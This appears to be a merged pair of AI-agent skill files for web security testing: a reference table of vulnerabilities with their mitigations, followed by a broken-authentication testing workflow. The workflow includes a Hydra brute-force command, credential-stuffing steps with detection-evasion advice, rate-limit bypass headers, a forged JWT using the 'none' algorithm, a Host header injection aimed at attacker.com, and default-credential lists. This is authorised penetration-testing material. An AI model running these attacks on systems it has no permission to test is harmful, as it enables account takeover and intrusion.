**Data Tampering (46)**
- Definition: Unauthorized modification of serialized data
- Root Cause: Missing integrity verification
- Impact: Data corruption, privilege manipulation
- Mitigation: Digital signatures, HMAC validation, encryption

**Object Injection (47)**
- Definition: Malicious object instantiation during deserialization
- Root Cause: Unsafe deserialization practices
- Impact: Code execution, unauthorized access
- Mitigation: Type restrictions, class whitelisting, secure libraries

### Phase 8: API Security Assessment

Evaluate API-specific vulnerabilities:

**Insecure API Endpoints (48)**
- Definition: APIs without proper security controls
- Root Cause: Poor API design, missing authentication
- Impact: Data breaches, unauthorized access
- Mitigation: OAuth/JWT, HTTPS, input validation, rate limiting

**API Key Exposure (49)**
- Definition: Leaked or exposed API credentials
- Root Cause: Hardcoded keys, insecure storage
- Impact: Unauthorized API access, abuse
- Mitigation: Secure key storage, rotation, environment variables

**Lack of Rate Limiting (50)**
- Definition: No controls on API request frequency
- Root Cause: Missing throttling mechanisms
- Impact: DoS, API abuse, resource exhaustion
- Mitigation: Rate limits per user/IP, throttling, DDoS protection

**Inadequate Input Validation (51)**
- Definition: APIs accepting unvalidated user input
- Root Cause: Missing server-side validation
- Impact: Injection attacks, data corruption
- Mitigation: Strict validation, parameterized queries, WAF

**API Abuse (75)**
- Definition: Exploiting API functionality for malicious purposes
- Root Cause: Excessive trust in client input
- Impact: Data theft, account takeover, service abuse
- Mitigation: Strong authentication, behavior analysis, anomaly detection

### Phase 9: Communication Security

Assess transport layer protections:

**Man-in-the-Middle Attack (52)**
- Definition: Interception of communication between parties
- Root Cause: Unencrypted channels, compromised networks
- Impact: Data theft, session hijacking, impersonation
- Mitigation: TLS/SSL, certificate pinning, mutual authentication

**Insufficient Transport Layer Security (53)**
- Definition: Weak or outdated encryption for data in transit
- Root Cause: Outdated protocols (SSLv2/3), weak ciphers
- Impact: Traffic interception, credential theft
- Mitigation: TLS 1.2+, strong cipher suites, HSTS

**Insecure SSL/TLS Configuration (54)**
- Definition: Improperly configured encryption settings
- Root Cause: Weak ciphers, missing forward secrecy
- Impact: Traffic decryption, MITM attacks
- Mitigation: Modern cipher suites, PFS, certificate validation

**Insecure Communication Protocols (55)**
- Definition: Use of unencrypted protocols (HTTP, Telnet, FTP)
- Root Cause: Legacy systems, security unawareness
- Impact: Traffic sniffing, credential exposure
- Mitigation: HTTPS, SSH, SFTP, VPN tunnels

### Phase 10: Client-Side Vulnerabilities

Evaluate browser-side security:

**DOM-based XSS (56)**
- Definition: XSS through client-side JavaScript manipulation
- Root Cause: Unsafe DOM manipulation with user input
- Impact: Session theft, credential harvesting
- Mitigation: Safe DOM APIs, CSP, input sanitization

**Insecure Cross-Origin Communication (57)**
- Definition: Improper handling of cross-origin requests
- Root Cause: Relaxed CORS/SOP policies
- Impact: Data leakage, CSRF attacks
- Mitigation: Strict CORS, CSRF tokens, origin validation

**Browser Cache Poisoning (58)**
- Definition: Manipulation of cached content
- Root Cause: Weak cache validation
- Impact: Malicious content delivery
- Mitigation: Cache-Control headers, HTTPS, integrity checks

**Clickjacking (59, 71)**
- Definition: UI redress attack tricking users into clicking hidden elements
- Root Cause: Missing frame protection
- Impact: Unintended actions, credential theft
- Mitigation: X-Frame-Options, CSP frame-ancestors, frame-busting

**HTML5 Security Issues (60)**
- Definition: Vulnerabilities in HTML5 APIs (WebSockets, Storage, Geolocation)
- Root Cause: Improper API usage, insufficient validation
- Impact: Data leakage, XSS, privacy violations
- Mitigation: Secure API usage, input validation, sandboxing

### Phase 11: Denial of Service Assessment

Evaluate availability threats:

**DDoS - Distributed Denial of Service (61)**
- Definition: Overwhelming systems with traffic from multiple sources
- Root Cause: Botnets, amplification attacks
- Impact: Service unavailability, revenue loss
- Mitigation: DDoS protection services, rate limiting, CDN

**Application Layer DoS (62)**
- Definition: Targeting application logic to exhaust resources
- Root Cause: Inefficient code, resource-intensive operations
- Impact: Application unavailability, degraded performance
- Mitigation: Rate limiting, caching, WAF, code optimization

**Resource Exhaustion (63)**
- Definition: Depleting CPU, memory, disk, or network resources
- Root Cause: Inefficient resource management
- Impact: System crashes, service degradation
- Mitigation: Resource quotas, monitoring, load balancing

**Slowloris Attack (64)**
- Definition: Keeping connections open with partial HTTP requests
- Root Cause: No connection timeouts
- Impact: Web server resource exhaustion
- Mitigation: Connection timeouts, request limits, reverse proxy

### Phase 12: Server-Side Request Forgery

Assess SSRF vulnerabilities:

**SSRF - Server-Side Request Forgery (66)**
- Definition: Manipulating server to make requests to internal resources
- Root Cause: Unvalidated user-controlled URLs
- Impact: Internal network access, data theft, cloud metadata access
- Mitigation: URL whitelisting, network segmentation, egress filtering

**Blind SSRF (87)**
- Definition: SSRF without direct response visibility
- Root Cause: Similar to SSRF, harder to detect
- Impact: Data exfiltration, internal reconnaissance
- Mitigation: Allowlists, WAF, network restrictions

**Time-Based Blind SSRF (88)**
- Definition: Inferring SSRF success through response timing
- Root Cause: Processing delays indicating request outcomes
- Impact: Prolonged exploitation, detection evasion
- Mitigation: Request timeouts, anomaly detection, timing monitoring

### Phase 13: Additional Web Vulnerabilities

| # | Vulnerability | Root Cause | Impact | Mitigation |
|---|--------------|-----------|--------|------------|
| 67 | HTTP Parameter Pollution | Inconsistent parsing | Injection, ACL bypass | Strict parsing, validation |
| 68 | Insecure Redirects | Unvalidated targets | Phishing, malware | Whitelist destinations |
| 69 | File Inclusion (LFI/RFI) | Unvalidated paths | Code exec, disclosure | Whitelist files, disable RFI |
| 70 | Security Header Bypass | Misconfigured headers | XSS, clickjacking | Proper headers, audits |
| 72 | Inadequate Session Timeout | Excessive timeouts | Session hijacking | Idle termination, timeouts |
| 73 | Insufficient Logging | Missing infrastructure | Detection gaps | SIEM, alerting |
| 74 | Business Logic Flaws | Insecure design | Fraud, unauthorized ops | Threat modeling, testing |

### Phase 14: Mobile and IoT Security

| # | Vulnerability | Root Cause | Impact | Mitigation |
|---|--------------|-----------|--------|------------|
| 76 | Insecure Mobile Storage | Plain text, weak crypto | Data theft | Keychain/Keystore, encrypt |
| 77 | Insecure Mobile Transmission | HTTP, cert failures | Traffic interception | TLS, cert pinning |
| 78 | Insecure Mobile APIs | Missing auth/validation | Data exposure | OAuth/JWT, validation |
| 79 | App Reverse Engineering | Hardcoded creds | Credential theft | Obfuscation, RASP |
| 80 | IoT Management Issues | Weak auth, no TLS | Device takeover | Strong auth, TLS |
| 81 | Weak IoT Authentication | Default passwords | Unauthorized access | Unique creds, MFA |
| 82 | IoT Vulnerabilities | Design flaws, old firmware | Botnet recruitment | Updates, segmentation |
| 83 | Smart Home Access | Insecure defaults | Privacy invasion | MFA, segmentation |
| 84 | IoT Privacy Issues | Excessive collection | Surveillance | Data minimization |

### Phase 15: Advanced and Zero-Day Threats

| # | Vulnerability | Root Cause | Impact | Mitigation |
|---|--------------|-----------|--------|------------|
| 89 | MIME Sniffing | Missing headers | XSS, spoofing | X-Content-Type-Options |
| 91 | CSP Bypass | Weak config | XSS despite CSP | Strict CSP, nonces |
| 92 | Inconsistent Validation | Decentralized logic | Control bypass | Centralized validation |
| 93 | Race Conditions | Missing sync | Privilege escalation | Proper locking |
| 94-95 | Business Logic Flaws | Missing validation | Financial fraud | Server-side validation |
| 96 | Account Enumeration | Different responses | Targeted attacks | Uniform responses |
| 98-99 | Unpatched Vulnerabilities | Patch delays | Zero-day exploitation | Patch management |
| 100 | Zero-Day Exploits | Unknown vulns | Unmitigated attacks | Defense in depth |

---

## Quick Reference

### Vulnerability Categories Summary

| Category | Vulnerability Numbers | Key Controls |
|----------|----------------------|--------------|
| Injection | 1-13 | Parameterized queries, input validation, output encoding |
| Authentication | 14-23, 85-86 | MFA, session management, account lockout |
| Data Exposure | 24-27 | Encryption at rest/transit, access controls, DLP |
| Misconfiguration | 28-36 | Secure defaults, hardening, patching |
| XML | 37-39, 65 | Disable external entities, limit expansion |
| Access Control | 40-44 | RBAC, least privilege, authorization checks |
| Deserialization | 45-47 | Avoid untrusted data, integrity validation |
| API Security | 48-51, 75 | OAuth, rate limiting, input validation |
| Communication | 52-55 | TLS 1.2+, certificate validation, HTTPS |
| Client-Side | 56-60 | CSP, X-Frame-Options, safe DOM |
| DoS | 61-65 | Rate limiting, DDoS protection, resource limits |
| SSRF | 66, 87-88 | URL whitelisting, egress filtering |
| Mobile/IoT | 76-84 | Encryption, authentication, secure storage |
| Business Logic | 74, 92-97 | Threat modeling, logic testing |
| Zero-Day | 98-100 | Defense in depth, threat intelligence |

### Critical Security Headers

```
Content-Security-Policy: default-src 'self'; script-src 'self'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), microphone=()
```

### OWASP Top 10 Mapping

| OWASP 2021 | Related Vulnerabilities |
|------------|------------------------|
| A01: Broken Access Control | 40-44, 23, 74 |
| A02: Cryptographic Failures | 24-25, 53-55 |
| A03: Injection | 1-13, 37-39 |
| A04: Insecure Design | 74, 92-97 |
| A05: Security Misconfiguration | 26-36 |
| A06: Vulnerable Components | 34, 98-100 |
| A07: Auth Failures | 14-23, 85-86 |
| A08: Data Integrity | 45-47 |
| A09: Logging Failures | 73 |
| A10: SSRF | 66, 87-88 |

---

## Constraints and Limitations

- Vulnerability definitions represent common patterns; specific implementations vary
- Mitigations must be adapted to technology stack and architecture
- New vulnerabilities emerge continuously; reference should be updated
- Some vulnerabilities overlap across categories (e.g., IDOR appears in multiple contexts)
- Effectiveness of mitigations depends on proper implementation
- Automated scanners cannot detect all vulnerability types (especially business logic)

---

## Troubleshooting

### Common Assessment Challenges

| Challenge | Solution |
|-----------|----------|
| False positives in scanning | Manual verification, contextual analysis |
| Business logic flaws missed | Manual testing, threat modeling, abuse case analysis |
| Encrypted traffic analysis | Proxy configuration, certificate installation |
| WAF blocking tests | Rate adjustment, IP rotation, payload encoding |
| Session handling issues | Cookie management, authentication state tracking |
| API discovery | Swagger/OpenAPI enumeration, traffic analysis |

### Vulnerability Verification Techniques

| Vulnerability Type | Verification Approach |
|-------------------|----------------------|
| Injection | Payload testing with encoded variants |
| XSS | Alert boxes, cookie access, DOM inspection |
| CSRF | Cross-origin form submission testing |
| SSRF | Out-of-band DNS/HTTP callbacks |
| XXE | External entity with controlled server |
| Access Control | Horizontal/vertical privilege testing |
| Authentication | Credential rotation, session analysis |

---

## References

- OWASP Top 10 Web Application Security Risks
- CWE/SANS Top 25 Most Dangerous Software Errors
- OWASP Testing Guide
- OWASP Application Security Verification Standard (ASVS)
- NIST Cybersecurity Framework
- Source: Kumar MS - Top 100 Web Vulnerabilities

## When to Use
This skill is applicable to execute the workflow or actions described in the overview.


<!-- MERGED INTO: web-vuln-testing on 2026-04-18 -->
<!-- Use `web-vuln-testing` instead. -->

---

<!-- broken-authentication -->
## Purpose

Identify and exploit authentication and session management vulnerabilities in web applications. Broken authentication consistently ranks in the OWASP Top 10 and can lead to account takeover, identity theft, and unauthorized access to sensitive systems. This skill covers testing methodologies for password policies, session handling, multi-factor authentication, and credential management.

## Prerequisites

### Required Knowledge
- HTTP protocol and session mechanisms
- Authentication types (SFA, 2FA, MFA)
- Cookie and token handling
- Common authentication frameworks

### Required Tools
- Burp Suite Professional or Community
- Hydra or similar brute-force tools
- Custom wordlists for credential testing
- Browser developer tools

### Required Access
- Target application URL
- Test account credentials
- Written authorization for testing

## Outputs and Deliverables

1. **Authentication Assessment Report** - Document all identified vulnerabilities
2. **Credential Testing Results** - Brute-force and dictionary attack outcomes
3. **Session Security Analysis** - Token randomness and timeout evaluation
4. **Remediation Recommendations** - Security hardening guidance

## Core Workflow

### Phase 1: Authentication Mechanism Analysis

Understand the application's authentication architecture:

```
# Identify authentication type
- Password-based (forms, basic auth, digest)
- Token-based (JWT, OAuth, API keys)
- Certificate-based (mutual TLS)
- Multi-factor (SMS, TOTP, hardware tokens)

# Map authentication endpoints
/login, /signin, /authenticate
/register, /signup
/forgot-password, /reset-password
/logout, /signout
/api/auth/*, /oauth/*
```

Capture and analyze authentication requests:

```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=test&password=test123
```

### Phase 2: Password Policy Testing

Evaluate password requirements and enforcement:

```bash
# Test minimum length (a, ab, abcdefgh)
# Test complexity (password, password1, Password1!)
# Test common weak passwords (123456, password, qwerty, admin)
# Test username as password (admin/admin, test/test)
```

Document policy gaps: Minimum length <8, no complexity, common passwords allowed, username as password.

### Phase 3: Credential Enumeration

Test for username enumeration vulnerabilities:

```bash
# Compare responses for valid vs invalid usernames
# Invalid: "Invalid username" vs Valid: "Invalid password"
# Check timing differences, response codes, registration messages
```

# Password reset
"Email sent if account exists" (secure)
"No account with that email" (leaks info)

# API responses
{"error": "user_not_found"}
{"error": "invalid_password"}
```

### Phase 4: Brute Force Testing

Test account lockout and rate limiting:

```bash
# Using Hydra for form-based auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# Using Burp Intruder
1. Capture login request
2. Send to Intruder
3. Set payload positions on password field
4. Load wordlist
5. Start attack
6. Analyze response lengths/codes
```

Check for protections:

```bash
# Account lockout
- After how many attempts?
- Duration of lockout?
- Lockout notification?

# Rate limiting
- Requests per minute limit?
- IP-based or account-based?
- Bypass via headers (X-Forwarded-For)?

# CAPTCHA
- After failed attempts?
- Easily bypassable?
```

### Phase 5: Credential Stuffing

Test with known breached credentials:

```bash
# Credential stuffing differs from brute force
# Uses known email:password pairs from breaches

# Using Burp Intruder with Pitchfork attack
1. Set username and password as positions
2. Load email list as payload 1
3. Load password list as payload 2 (matched pairs)
4. Analyze for successful logins

# Detection evasion
- Slow request rate
- Rotate source IPs
- Randomize user agents
- Add delays between attempts
```

### Phase 6: Session Management Testing

Analyze session token security:

```bash
# Capture session cookie
Cookie: SESSIONID=abc123def456

# Test token characteristics
1. Entropy - Is it random enough?
2. Length - Sufficient length (128+ bits)?
3. Predictability - Sequential patterns?
4. Secure flags - HttpOnly, Secure, SameSite?
```

Session token analysis:

```python
#!/usr/bin/env python3
import requests
import hashlib

# Collect multiple session tokens
tokens = []
for i in range(100):
    response = requests.get("https://target.com/login")
    token = response.cookies.get("SESSIONID")
    tokens.append(token)

# Analyze for patterns
# Check for sequential increments
# Calculate entropy
# Look for timestamp components
```

### Phase 7: Session Fixation Testing

Test if session is regenerated after authentication:

```bash
# Step 1: Get session before login
GET /login HTTP/1.1
Response: Set-Cookie: SESSIONID=abc123

# Step 2: Login with same session
POST /login HTTP/1.1
Cookie: SESSIONID=abc123
username=valid&password=valid

# Step 3: Check if session changed
# VULNERABLE if SESSIONID remains abc123
# SECURE if new session assigned after login
```

Attack scenario:

```bash
# Attacker workflow:
1. Attacker visits site, gets session: SESSIONID=attacker_session
2. Attacker sends link to victim with fixed session:
   https://target.com/login?SESSIONID=attacker_session
3. Victim logs in with attacker's session
4. Attacker now has authenticated session
```

### Phase 8: Session Timeout Testing

Verify session expiration policies:

```bash
# Test idle timeout
1. Login and note session cookie
2. Wait without activity (15, 30, 60 minutes)
3. Attempt to use session
4. Check if session is still valid

# Test absolute timeout
1. Login and continuously use session
2. Check if forced logout after set period (8 hours, 24 hours)

# Test logout functionality
1. Login and note session
2. Click logout
3. Attempt to reuse old session cookie
4. Session should be invalidated server-side
```

### Phase 9: Multi-Factor Authentication Testing

Assess MFA implementation security:

```bash
# OTP brute force
- 4-digit OTP = 10,000 combinations
- 6-digit OTP = 1,000,000 combinations
- Test rate limiting on OTP endpoint

# OTP bypass techniques
- Skip MFA step by direct URL access
- Modify response to indicate MFA passed
- Null/empty OTP submission
- Previous valid OTP reuse

# API Version Downgrade Attack (crAPI example)
# If /api/v3/check-otp has rate limiting, try older versions:
POST /api/v2/check-otp
{"otp": "1234"}
# Older API versions may lack security controls

# Using Burp for OTP testing
1. Capture OTP verification request
2. Send to Intruder
3. Set OTP field as payload position
4. Use numbers payload (0000-9999)
5. Check for successful bypass
```

Test MFA enrollment:

```bash
# Forced enrollment
- Can MFA be skipped during setup?
- Can backup codes be accessed without verification?

# Recovery process
- Can MFA be disabled via email alone?
- Social engineering potential?
```

### Phase 10: Password Reset Testing

Analyze password reset security:

```bash
# Token security
1. Request password reset
2. Capture reset link
3. Analyze token:
   - Length and randomness
   - Expiration time
   - Single-use enforcement
   - Account binding

# Token manipulation
https://target.com/reset?token=abc123&user=victim
# Try changing user parameter while using valid token

# Host header injection
POST /forgot-password HTTP/1.1
Host: attacker.com
email=victim@email.com
# Reset email may contain attacker's domain
```

## Quick Reference

### Common Vulnerability Types

| Vulnerability | Risk | Test Method |
|--------------|------|-------------|
| Weak passwords | High | Policy testing, dictionary attack |
| No lockout | High | Brute force testing |
| Username enumeration | Medium | Differential response analysis |
| Session fixation | High | Pre/post-login session comparison |
| Weak session tokens | High | Entropy analysis |
| No session timeout | Medium | Long-duration session testing |
| Insecure password reset | High | Token analysis, workflow bypass |
| MFA bypass | Critical | Direct access, response manipulation |

### Credential Testing Payloads

```bash
# Default credentials
admin:admin
admin:password
admin:123456
root:root
test:test
user:user

# Common passwords
123456
password
12345678
qwerty
abc123
password1
admin123

# Breached credential databases
- Have I Been Pwned dataset
- SecLists passwords
- Custom targeted lists
```

### Session Cookie Flags

| Flag | Purpose | Vulnerability if Missing |
|------|---------|------------------------|
| HttpOnly | Prevent JS access | XSS can steal session |
| Secure | HTTPS only | Sent over HTTP |
| SameSite | CSRF protection | Cross-site requests allowed |
| Path | URL scope | Broader exposure |
| Domain | Domain scope | Subdomain access |
| Expires | Lifetime | Persistent sessions |

### Rate Limiting Bypass Headers

```http
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
```

## Constraints and Limitations

### Legal Requirements
- Only test with explicit written authorization
- Avoid testing with real breached credentials
- Do not access actual user accounts
- Document all testing activities

### Technical Limitations
- CAPTCHA may prevent automated testing
- Rate limiting affects brute force timing
- MFA significantly increases attack difficulty
- Some vulnerabilities require victim interaction

### Scope Considerations
- Test accounts may behave differently than production
- Some features may be disabled in test environments
- Third-party authentication may be out of scope
- Production testing requires extra caution

## Examples

### Example 1: Account Lockout Bypass

**Scenario:** Test if account lockout can be bypassed

```bash
# Step 1: Identify lockout threshold
# Try 5 wrong passwords for admin account
# Result: "Account locked for 30 minutes"

# Step 2: Test bypass via IP rotation
# Use X-Forwarded-For header
POST /login HTTP/1.1
X-Forwarded-For: 192.168.1.1
username=admin&password=attempt1

# Increment IP for each attempt
X-Forwarded-For: 192.168.1.2
# Continue until successful or confirmed blocked

# Step 3: Test bypass via case manipulation
username=Admin (vs admin)
username=ADMIN
# Some systems treat these as different accounts
```

### Example 2: JWT Token Attack

**Scenario:** Exploit weak JWT implementation

```bash
# Step 1: Capture JWT token
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCJ9.signature

# Step 2: Decode and analyze
# Header: {"alg":"HS256","typ":"JWT"}
# Payload: {"user":"test","role":"user"}

# Step 3: Try "none" algorithm attack
# Change header to: {"alg":"none","typ":"JWT"}
# Remove signature
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.

# Step 4: Submit modified token
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

### Example 3: Password Reset Token Exploitation

**Scenario:** Test password reset functionality

```bash
# Step 1: Request reset for test account
POST /forgot-password
email=test@example.com

# Step 2: Capture reset link
https://target.com/reset?token=a1b2c3d4e5f6

# Step 3: Test token properties
# Reuse: Try using same token twice
# Expiration: Wait 24+ hours and retry
# Modification: Change characters in token

# Step 4: Test for user parameter manipulation
https://target.com/reset?token=a1b2c3d4e5f6&email=admin@example.com
# Check if admin's password can be reset with test user's token
```

## Troubleshooting

| Issue | Solutions |
|-------|-----------|
| Brute force too slow | Identify rate limit scope; IP rotation; add delays; use targeted wordlists |
| Session analysis inconclusive | Collect 1000+ tokens; use statistical tools; check for timestamps; compare accounts |
| MFA cannot be bypassed | Document as secure; test backup/recovery mechanisms; check MFA fatigue; verify enrollment |
| Account lockout prevents testing | Request multiple test accounts; test threshold first; use slower timing |

## When to Use
This skill is applicable to execute the workflow or actions described in the overview.


<!-- MERGED INTO: web-vuln-testing on 2026-04-18 -->
<!-- Use `web-vuln-testing` instead. -->
